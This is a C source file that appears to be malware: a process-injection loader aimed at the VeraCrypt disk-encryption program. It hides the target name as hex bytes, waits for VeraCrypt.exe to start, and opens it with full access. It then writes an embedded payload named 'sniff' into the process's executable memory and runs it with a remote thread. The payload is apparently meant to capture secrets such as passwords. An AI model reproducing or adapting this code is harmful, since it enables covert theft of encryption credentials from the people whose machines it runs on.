#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#define UTILS_IMPLEMENTATION
#include "../c_utils/utils.h"

extern DWORD ExecuteRemoteThread64(HANDLE hTargetProc, LPVOID lpvRemotePayloadMem, PHANDLE hThread);

int main(void)
{
    char cProlog[] = {0xFFFFFFFFFFFF};

    char cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = UtilsFindTargetProcessID(cVeraCrypt);

        if (dwProcID != -1)
        {
            break;
        }

        UtilsSleep(5000);
    }

    HANDLE hTargetProc = UtilsOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hTargetProc == NULL)
    {
        return 0;
    }

#include "sniff.x64.bin.h"

    LPVOID lpvRemotePayloadMem = UtilsVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
    if (lpvRemotePayloadMem == NULL)
    {
        goto shutdown;
    }

    if (!UtilsWriteProcessMemory(hTargetProc, lpvRemotePayloadMem, sniff_data, sniff_data_len, NULL))
    {
        goto shutdown;
    }

    HANDLE hThread = NULL;
    DWORD iRetVal = ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);

    if (hThread != NULL)
    {
        UtilsResumeThread(hThread);
    }

    char cPrintString[] = {0x59, 0x6f, 0x6f, 0x68, 0x6f, 0x6f, 0x6f, 0x21, 0x21, 0x21, 0};
    UtilsOutputDebugStringA(cPrintString);

shutdown:
    UtilsCloseHandle(hTargetProc);
    char cEpilog[] = {0xAAAAAAAAAAAAAA};
    return 0;
}
